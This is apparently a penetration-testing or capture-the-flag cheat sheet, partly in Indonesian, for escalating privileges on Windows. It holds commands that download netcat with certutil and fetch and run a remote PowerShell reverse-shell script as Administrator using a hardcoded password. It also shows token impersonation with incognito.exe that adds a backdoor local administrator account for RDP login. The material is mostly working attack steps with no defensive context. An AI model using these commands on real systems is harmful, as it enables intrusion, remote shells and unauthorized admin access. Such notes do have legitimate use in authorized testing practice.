## Check System Info --
~# systeminfo

## Download File From CMD (Not PowerShell) -- 
certutil.exe -urlcache -split -f "http://10.14.17.16:4545/nc.exe" %tmp%\nc.exe

## Download File From PowerShell) -- 

(New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "C:\Windows\Temp\archive.zip")  

## Reverse Shell With Nishang To Get Powershell --

## Windows  Exploit Suggester --

##Run Nishang As Administrator to get root! -- 
We must get low shell with nishang. Then run this command

Requirement : SeChangeNotifyPrivilege       Bypass traverse checking             Enabled

Check : whoami /all
PRIVILEGES INFORMATION                                                                                                                                                                                                            [319/687]
----------------------                                                                                                                                                                                                                     
                                                                                                                                                                                                                                           
Privilege Name                Description                          State                                                                                                                                                                   
============================= ==================================== ========                                                                                                                                                                
SeShutdownPrivilege           Shut down the system                 Disabled                                                                                                                                                                
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled  <<---                                                                                                                                                            
SeUndockPrivilege             Remove computer from docking station Disabled                                                                                                                                                                
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled                                                                                                                                                                
SeTimeZonePrivilege           Change the time zone                 Disabled 

Then run this command
$SecPass = ConvertTo-SecureString -AsPlainText -Force 'Welcome1!' 
$cred = New-Object System.Management.Automation.PSCredential('Administrator',$SecPass)
Start-Process -Filepath "powershell" -argumentlist "IEX (New-Object Net.WebClient).downloadString('http://10.10.14.29/Invoke-PowershellTcp.ps1')" -Credential $cred

## Token Impersonate

Windows menggunakan Token sebagai Identifier untuk setiap pengguna. Token ini di generate saat login. Ada celah keamanan dimana user biasa bisa melakukan priv esc bilamana user kita saat ini memiliki permission seDebugPrivilege dan SeImpersonatePrivilege

Untuk cek apakah user bisa di impersonate cek di CMD :
$ whoami /priv
pastikan seDebugPrivilege dan SeImpersonatePrivilege enabled. 

Lalu cek user mana saja yang bisa di impersonate. Kita bisa pakai incognito.exe, commandnya :

* incognito.exe list tokens -u //list token available to impersonate
* incognito.exe add_user mrdoel 123456 //add new user
* incognito.exe add_localgroup_user Administrators mrdoel  //add new user to the local administrators group
* net user mrdoel //cek apakah user sudah ditambahkan ke group administrator (Local Group Memberships      *Administrators)

Jika RDP tersedit maka kita bisa login sebagai root dengan command
`rdesktop -u mrdoel -p 123456 target.local`
